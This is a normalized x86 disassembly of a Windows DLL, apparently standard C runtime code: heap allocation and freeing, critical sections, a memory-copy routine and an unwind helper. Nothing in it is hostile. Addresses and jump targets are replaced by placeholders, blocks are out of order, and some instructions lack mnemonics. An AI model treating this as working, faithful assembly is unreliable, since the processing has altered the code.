mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_10005460
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push 0x400000
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_10007c70
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + 0x400000 ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_100055a4
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_100055fa
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_100055a4
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_100056bc
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_10005713
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_100055fa
pop ecx
sub_10005758
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_10005460
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_10005960
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_10005960
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_10007c70
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_10005960
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_10005a84
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_10005b56
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
pop edi
pop esi
retn
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
push eax
call edi
push [ esi ]
call sub_1000440b
pop ecx
sub_10005bc2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_100047df
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_10005bc2
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_10004776
pop ecx
call sub_1000440b
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_10005c23
pop ecx
pop edi
sub_10005c38
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_10005c53
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_10005c80
push ebp
mov ebp esp
mov eax 0x122c
call sub_100047b0
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_10005c53
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_10007ef0
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_10004580
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_10006df0
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_10007cc8
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_10005dc8
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_10005c80
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_10004919
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_10005460
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_10005e25
mov eax [ rw-data ]
push esi
cmp eax 0x3
push edi
jne r-xdata
cmp eax 0x2
jne r-xdata
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push ebp
mov ebp [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
pop edi
pop esi
retn
mov edi rw-data
mov esi edi
push [ rw-data ]
push 0x0
push [ rw-data ]
call ebp
pop ebp
pop ebx
jmp r-xdata
mov eax [ rw-data ]
mov edi [ VirtualFree@IAT ]
lea esi [ eax + 0xc ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
push 0x4000
push 0x100000
push [ esi ]
call edi
push 0x8000
push 0x0
push [ esi ]
call edi
push [ esi + 0x4 ]
push 0x0
push [ rw-data ]
call ebp
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
sub_10005ed0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10005f30 ]
jmp [ ecx * 4 + jump_table_10005fac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006018 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10006018 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_100061b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_100060b8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100061b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006018 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006018 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006018 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100061b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100061b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100061b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100061b0 ]
sub_10006208
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000624a
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
